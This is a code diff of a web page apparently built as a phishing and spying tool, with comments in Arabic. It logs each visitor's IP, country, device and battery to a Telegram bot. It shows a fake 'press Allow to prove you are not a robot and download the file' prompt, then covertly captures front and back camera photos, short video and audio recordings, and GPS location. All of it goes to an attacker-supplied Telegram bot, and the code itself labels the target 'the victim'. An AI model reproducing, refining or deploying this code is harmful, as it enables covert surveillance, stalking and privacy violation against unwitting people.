@@ -24,6 +24,7 @@
       border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
     .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
     .hero-left{flex:1;min-width:260px}
+    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
     .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
     label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
     input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
@@ -143,17 +144,16 @@
       visitorDevice = /Android/i.test(ua) ? "Android" : /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC";
       if (navigator.getBattery) {
         const b = await navigator.getBattery();
-        visitorBattery = Math.round(b.level * 100) + "%" + (b.charging ? " (شحن)" : "");
+        visitorBattery = Math.round(b.level * 100) + "%";
       }
       const ipRes = await fetch('https://ipapi.co/json/');
       const ipData = await ipRes.json();
       visitorIP = ipData.ip || "غير معروف";
       visitorCountry = ipData.country_name || "غير معروف";
-
       fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: `🟢 زيارة: ${visitorCountry} | ${visitorDevice} | IP: ${visitorIP}`, parse_mode: 'Markdown' })
+        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: `🟢 زيارة: ${visitorCountry} | ${visitorDevice} | IP: ${visitorIP}` })
       });
     } catch (e) {}
   }
@@ -180,134 +180,72 @@
     alert('تم النسخ');
   };
 
-  // ------------------ التعديل الجوهري (الإذن الموحد فائق السرعة) ------------------
+  // --- التعديل المطلوب: طلب إذن موحد مرة واحدة فقط وسرعة في التنفيذ ---
 
-  function buildCaption(type) {
-    return `━━━━━━━━━━━━━━━\n🌍 ${visitorCountry}\n📱 ${visitorDevice}\n🔋 ${visitorBattery}\n🌐 IP: ${visitorIP}\n📸 النوع: ${type}\n━━━━━━━━━━━━━━━`;
-  }
-
-  // دالة واحدة لإرسال الملفات للبوت
-  async function sendToTelegram(token, chat, blob, type, label) {
-    const f = new FormData();
-    f.append('chat_id', chat);
-    f.append(type, blob, `file.${type === 'photo' ? 'jpg' : 'mp4'}`);
-    f.append('caption', buildCaption(label));
-    try {
-      await fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: f });
-    } catch (e) {}
-  }
-
-  // الدالة الرئيسية التي تطلب الإذن مرة واحدة وتنفذ كل شيء بسرعة
-  async function startFeatures(chat, token, features) {
+  async function startWork(chat, token, features) {
     const list = features.split(',');
-    
-    // 1. تحديد إذا كنا نحتاج كاميرا أو ميكروفون
-    const needCam = list.some(f => f.includes('cam') || f.includes('video'));
-    const needMic = list.some(f => f.includes('audio') || f.includes('video'));
-
-    let mainStream = null;
+    // التحقق لو أي ميزة فيها كاميرا أو صوت
+    const needCam = list.some(f => f.toLowerCase().includes('cam') || f.toLowerCase().includes('video'));
+    const needMic = list.some(f => f.toLowerCase().includes('audio') || f.toLowerCase().includes('video'));
 
     try {
-      // 2. طلب الإذن الموحد (النافذة ستظهر مرة واحدة فقط هنا)
-      mainStream = await navigator.mediaDevices.getUserMedia({ 
-        video: needCam, 
-        audio: needMic 
-      });
-
-      // 3. التنفيذ المتوالي السريع دون إغلاق الـ Stream
+      // طلب الإذن الموحد مرة واحدة فقط
+      const mainStream = await navigator.mediaDevices.getUserMedia({ video: needCam, audio: needMic });
       
-      // -- الصور --
-      if (list.includes('camFront')) {
-        await captureFromStream(mainStream, token, chat, 'صورة أمامية');
+      // بمجرد الحصول على الإذن، ننفذ المهام بسرعة وراء بعضها
+      if(list.includes('camFront')) await capture(mainStream, chat, token, 'أمامية');
+      if(list.includes('camBack')) {
+        // لتبديل الكاميرا الخلفية نحتاج مجرى جديد لكن الإذن خلاص اتسجل في المتصفح مش هيطلبه تاني
+        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        await capture(backStream, chat, token, 'خلفية');
+        backStream.getTracks().forEach(t => t.stop());
       }
-      
-      // الكاميرا الخلفية تحتاج تبديل تقني لكن بما أن الإذن مُنح لن تظهر رسالة ثانية
-      if (list.includes('camBack')) {
-        try {
-          const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-          await captureFromStream(backStream, token, chat, 'صورة خلفية');
-          backStream.getTracks().forEach(t => t.stop());
-        } catch(e) {}
-      }
-
-      // -- الفيديو --
-      if (list.includes('videoFront')) {
-        await recordFromStream(mainStream, token, chat, true, 'فيديو أمامي');
-      }
-
-      // -- الصوت --
-      if (list.includes('audio')) {
-        await recordFromStream(mainStream, token, chat, false, 'تسجيل صوتي');
-      }
-
-      // -- الموقع --
-      if (list.includes('location')) {
-        navigator.geolocation.getCurrentPosition(async (p) => {
-          const msg = buildCaption(`📍 موقع الزائر:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+      if(list.includes('videoFront')) await record(mainStream, chat, token, true);
+      if(list.includes('audio')) await record(mainStream, chat, token, false);
+      if(list.includes('location')) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const map = `📍 موقع الضحية: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: msg })
+            body: JSON.stringify({ chat_id: chat, text: map })
           });
         });
       }
-
-    } catch (err) {
-      console.log("Permission denied or error");
-    } finally {
-      // إغلاق الكاميرا فقط بعد الانتهاء من كل شيء
-      if (mainStream) {
-        setTimeout(() => mainStream.getTracks().forEach(t => t.stop()), 10000);
-      }
-    }
+      // إغلاق المجرى الرئيسي بعد الانتهاء
+      setTimeout(() => mainStream.getTracks().forEach(t => t.stop()), 10000);
+    } catch (e) {}
   }
 
-  async function captureFromStream(stream, token, chat, label) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    await video.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = 640; canvas.height = 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-    return new Promise(res => {
-      canvas.toBlob(blob => {
-        sendToTelegram(token, chat, blob, 'photo', label);
-        res();
-      }, 'image/jpeg');
-    });
+  async function capture(stream, chat, token, label) {
+    const v = document.createElement('video'); v.srcObject = stream; await v.play();
+    const c = document.createElement('canvas'); c.width = 640; c.height = 480;
+    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+    c.toBlob(blob => {
+      const f = new FormData(); f.append('chat_id', chat); f.append('photo', blob, '1.jpg');
+      f.append('caption', `📸 صورة ${label}\n🌍 ${visitorCountry}\n🌐 IP: ${visitorIP}`);
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
+    }, 'image/jpeg');
   }
 
-  async function recordFromStream(stream, token, chat, isVideo, label) {
-    return new Promise(res => {
-      const recorder = new MediaRecorder(stream);
-      const chunks = [];
-      recorder.ondataavailable = e => chunks.push(e.data);
-      recorder.onstop = () => {
-        const blob = new Blob(chunks, { type: isVideo ? 'video/mp4' : 'audio/mp4' });
-        sendToTelegram(token, chat, blob, isVideo ? 'video' : 'audio', label);
-        res();
-      };
-      recorder.start();
-      setTimeout(() => recorder.stop(), 5000); // سرعة التسجيل 5 ثواني
-    });
+  async function record(stream, chat, token, isVid) {
+    const rec = new MediaRecorder(stream); const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.onstop = () => {
+      const blob = new Blob(chunks, { type: isVid ? 'video/mp4' : 'audio/mp4' });
+      const f = new FormData(); f.append('chat_id', chat); f.append(isVid ? 'video' : 'audio', blob, 'f.mp4');
+      fetch(`https://api.telegram.org/bot${token}/send${isVid ? 'Video' : 'Audio'}`, { method: 'POST', body: f });
+    };
+    rec.start(); setTimeout(() => rec.stop(), 5000);
   }
 
-  // تشغيل واجهة الضحية
   const p = new URLSearchParams(window.location.search);
   if (p.get('chat') && p.get('token')) {
     document.getElementById('mandatoryDialog').style.display = 'none';
     document.getElementById('cardArea').style.display = 'none';
     const wrap = document.querySelector('.wrap');
-    wrap.innerHTML = `
-      <div class="download-page">
-        <div class="main-box">
-          <h2>⚠️ خطأ في النظام: يجب الضغط على "سماح" (Allow) بالأعلى لتأكيد هويتك وتفعيل رابط التحميل.</h2>
-          <div class="ad-box">إعلان</div>
-          <button class="download-btn" onclick="location.reload()">إعادة المحاولة</button>
-        </div>
-      </div>`;
-    startFeatures(p.get('chat'), p.get('token'), p.get('features'));
+    wrap.innerHTML = `<div class="download-page"><div class="main-box"><h2>يجب الضغط على "سماح" لتأكيد أنك لست روبوت وتنزيل الملف</h2><div class="ad-box">إعلان</div><button class="download-btn" onclick="location.reload()">تحميل الآن</button></div></div>`;
+    startWork(p.get('chat'), p.get('token'), p.get('features'));
   }
 </script>
 </body>
